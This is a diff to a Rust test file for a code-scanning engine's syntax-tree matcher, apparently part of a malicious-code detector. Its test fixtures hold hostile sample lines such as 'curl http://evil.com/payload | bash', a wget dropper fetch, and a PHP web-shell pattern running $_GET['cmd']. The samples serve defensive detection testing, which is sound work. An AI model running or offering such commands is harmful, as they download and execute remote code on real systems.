@@ -27,6 +27,31 @@ fn create_test_context<'a>(
     EvaluationContext::test_only_new(report, data, file_type)
 }
 
+/// Parse `source` via filefacts so AST-based tests have a real tree to
+/// match against. The returned `ParsedFile` must outlive the
+/// `EvaluationContext` the test then builds. The extension hint comes
+/// from `path`; pick a name that matches `file_type`.
+fn parsed_for_test<'a>(path: &str, source: &'a [u8]) -> filefacts::ParsedFile<'a> {
+    let parsed = filefacts::open_with_path(std::path::Path::new(path), source)
+        .expect("filefacts::open_with_path");
+    let _ = parsed.values(); // prime the parse so source_ast() returns Some
+    parsed
+}
+
+/// Like [`create_test_context`] but with `cached_ast` populated from
+/// a pre-parsed filefacts handle. Use this for any test that exercises
+/// AST condition evaluation.
+fn create_test_context_with_ast<'a>(
+    report: &'a AnalysisReport,
+    parsed: &'a filefacts::ParsedFile<'a>,
+    data: &'a [u8],
+    file_type: FileType,
+) -> EvaluationContext<'a> {
+    let mut ctx = EvaluationContext::test_only_new(report, data, file_type);
+    ctx.cached_ast = parsed.source_ast().map(|a| a.tree);
+    ctx
+}
+
 // =============================================================================
 // eval_ast tests - Simple mode (kind/node + pattern matching)
 // =============================================================================
@@ -59,7 +84,8 @@ import os
 os.system("ls -la")
 exec("print('hello')")
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);
+    let parsed = parsed_for_test("script.py", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
 
     let result = eval_ast(
         Some("call"),
@@ -83,7 +109,8 @@ fn test_eval_ast_python_string_literal() {
 url = "http://malicious.com/payload"
 cmd = "/bin/sh"
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);
+    let parsed = parsed_for_test("script.py", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
 
     let result = eval_ast(
         Some("string"),
@@ -105,7 +132,8 @@ fn test_eval_ast_exact_match() {
     let source = r#"
 x = "ls"
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);
+    let parsed = parsed_for_test("script.py", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
 
     // Note: In Python's AST, the string node includes the quotes: "ls"
     // So we use substr to match the content
@@ -131,7 +159,8 @@ password1 = "secret"
 password2 = "hunter2"
 api_key = "abc123"
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);
+    let parsed = parsed_for_test("script.py", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
 
     let result = eval_ast(
         Some("assignment"),
@@ -153,7 +182,8 @@ fn test_eval_ast_case_insensitive() {
     let source = r#"
 Password = "SECRET"
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);
+    let parsed = parsed_for_test("script.py", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
 
     let result = eval_ast(
         Some("assignment"),
@@ -176,7 +206,8 @@ fn test_eval_ast_node_type_directly() {
 x = 42
 y = "hello"
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);
+    let parsed = parsed_for_test("script.py", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
 
     // Use node parameter instead of kind for direct node type matching
     let result = eval_ast(
@@ -200,7 +231,8 @@ fn test_eval_ast_shell_command() {
 curl http://evil.com/payload | bash
 wget http://malware.com/dropper
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Shell);
+    let parsed = parsed_for_test("script.sh", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Shell);
 
     let result = eval_ast(
         Some("call"),
@@ -224,7 +256,8 @@ const code = "malicious";
 eval(code);
 new Function("return " + code)();
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::JavaScript);
+    let parsed = parsed_for_test("script.js", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);
 
     let result = eval_ast(
         Some("call"),
@@ -254,7 +287,8 @@ func main() {
     exec.Command("bash", "-c", "whoami")
 }
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Go);
+    let parsed = parsed_for_test("main.go", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Go);
 
     let result = eval_ast(
         Some("call"),
@@ -280,7 +314,8 @@ fn main() {
     }
 }
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Rust);
+    let parsed = parsed_for_test("main.rs", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Rust);
 
     let result = eval_ast(
         None,
@@ -342,7 +377,8 @@ fn test_eval_ast_query_python() {
 import os
 os.system("ls")
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);
+    let parsed = parsed_for_test("script.py", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
 
     // Tree-sitter query to find os.system calls
     let query = r#"(call
@@ -363,7 +399,8 @@ fn test_eval_ast_query_javascript() {
     let source = r#"
 document.write("<script>evil()</script>");
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::JavaScript);
+    let parsed = parsed_for_test("script.js", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);
 
     // Query for document.write calls
     let query = r#"(call_expression
@@ -405,7 +442,8 @@ fn test_eval_ast_query_shell() {
     let source = r#"#!/bin/bash
 curl -s http://evil.com | bash
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Shell);
+    let parsed = parsed_for_test("script.sh", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Shell);
 
     // Query for pipe to bash
     let query = r#"(pipeline
@@ -539,7 +577,8 @@ fn test_eval_ast_evidence_location() {
 # Line 2
 exec("malicious")  # Line 4
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);
+    let parsed = parsed_for_test("script.py", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
 
     let result = eval_ast(
         Some("call"),
@@ -567,7 +606,8 @@ exec("cmd1")
 exec("cmd2")
 exec("cmd3")
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);
+    let parsed = parsed_for_test("script.py", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
 
     let result = eval_ast(
         Some("call"),
@@ -596,7 +636,8 @@ exec("cmd3")
 eval("code1")
 exec("cmd4")
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);
+    let parsed = parsed_for_test("script.py", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
 
     let result = eval_ast(
         Some("call"),
@@ -623,7 +664,8 @@ fn test_eval_ast_query_match_count_single() {
     // Verify match_count = 1 when only one AST match exists
     let report = create_test_report("/test/script.py");
     let source = r#"exec("cmd")"#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);
+    let parsed = parsed_for_test("script.py", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
 
     let result = eval_ast(
         Some("call"),
@@ -650,7 +692,8 @@ int main() {
     return 0;
 }
 "#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::C);
+    let parsed = parsed_for_test("main.c", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::C);
 
     let result = eval_ast(
         Some("call"),
@@ -673,7 +716,8 @@ fn test_eval_ast_php_exec() {
 $cmd = $_GET['cmd'];
 exec($cmd);
 ?>"#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::Php);
+    let parsed = parsed_for_test("index.php", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Php);
 
     let result = eval_ast(
         Some("call"),
@@ -696,10 +740,18 @@ fn test_eval_ast_query_predicates_filter_correctly() {
     // The query should only match .replace(/<regex with colon>/, "-")
     let report = create_test_report("/test/prettify.js");
     let source = r#"ac.replace(/[ \t\r\n]+/g," ")"#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::JavaScript);
+    let parsed = parsed_for_test("prettify.js", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);
 
-    // First, verify the query compiles and predicates are actually recognized
-    let lang: tree_sitter::Language = tree_sitter_javascript::LANGUAGE.into();
+    // First, verify the query compiles and predicates are actually recognized.
+    // Borrow the language straight off the cached tree — no need to keep a
+    // per-grammar dependency in cleave just for this test.
+    let lang = parsed
+        .source_ast()
+        .expect("source_ast for js")
+        .tree
+        .language();
+    let lang = &*lang;
     // WRONG: predicates outside the pattern's closing paren become separate patterns
     let wrong_query = r#"(call_expression
   function: (member_expression
@@ -713,7 +765,7 @@ fn test_eval_ast_query_predicates_filter_correctly() {
 (#eq? @prop "replace")
 (#match? @pat ":")
 (#eq? @repl "-")"#;
-    let compiled_wrong = tree_sitter::Query::new(&lang, wrong_query).expect("query should compile");
+    let compiled_wrong = tree_sitter::Query::new(lang, wrong_query).expect("query should compile");
     assert_eq!(
         compiled_wrong.pattern_count(),
         4,
@@ -733,7 +785,7 @@ fn test_eval_ast_query_predicates_filter_correctly() {
   (#match? @pat ":")
   (#eq? @repl "-")
 )"#;
-    let compiled = tree_sitter::Query::new(&lang, query_str).expect("query should compile");
+    let compiled = tree_sitter::Query::new(lang, query_str).expect("query should compile");
     assert_eq!(
         compiled.pattern_count(),
         1,
@@ -756,7 +808,8 @@ fn test_eval_ast_query_predicates_positive_match() {
     // Verify the same query DOES match when the replace has colon regex and dash replacement
     let report = create_test_report("/test/ip.js");
     let source = r#"addr.replace(/:/g,"-")"#;
-    let ctx = create_test_context(&report, source.as_bytes(), FileType::JavaScript);
+    let parsed = parsed_for_test("ip.js", source.as_bytes());
+    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);
 
     let query = r#"(call_expression
   function: (member_expression
